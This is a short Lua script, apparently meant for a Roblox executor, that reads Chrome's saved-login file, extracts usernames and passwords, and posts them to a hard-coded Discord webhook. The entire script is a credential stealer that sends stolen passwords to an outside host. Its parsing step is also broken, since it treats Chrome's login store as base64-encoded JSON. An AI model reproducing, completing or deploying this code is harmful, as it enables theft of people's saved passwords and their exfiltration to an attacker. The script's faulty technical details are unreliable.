local function sendWebhook(webhookUrl, data)
    local headers = {
        ["content-type"] = "application/json"
    }
    
    -- Choose an HTTP request function compatible with your environment
    local request = http_request or request or HttpPost or syn.request
    local payload = {Url = webhookUrl, Body = data, Method = "POST", Headers = headers}
    
    request(payload)
end

local function createWebhookData(passwords)
    -- Customize the message content
    local content = "Retrieved passwords:\n"
    for _, password in ipairs(passwords) do
        content = content .. password.username .. ": " .. password.password .. "\n"
    end
    return '{"content": "' .. content .. '"}'
end

local function getChromePasswords()
    local f = io.open("////path////to////chrome////profile////Login Data", "rb")
    local login_data = f:read("*all")
    f:close()

    local decoded = require "base64".decode(login_data)
    local logins = require "cjson".decode(decoded)

    local passwords = {}
    for i, v in ipairs(logins) do
        local username, password
        for k, v2 in pairs(v) do
            if k == "username" then
                username = v2
            elseif k == "password" then
                password = v2
            end
        end
        if username and password then
            table.insert(passwords, {username = username, password = password})
        end
    end
    return passwords
end

local webhookUrl = "https://discord.com/api/webhooks/1288886461080408126/or_ljH8rWPnHus5yE87SxaNLwoCO_7dlpPE_pFd5PI75kjMZztyRwcVgNZFS5V13Tfsf"
local passwords = getChromePasswords()
local webhookData = createWebhookData(passwords)

sendWebhook(webhookUrl, webhookData)
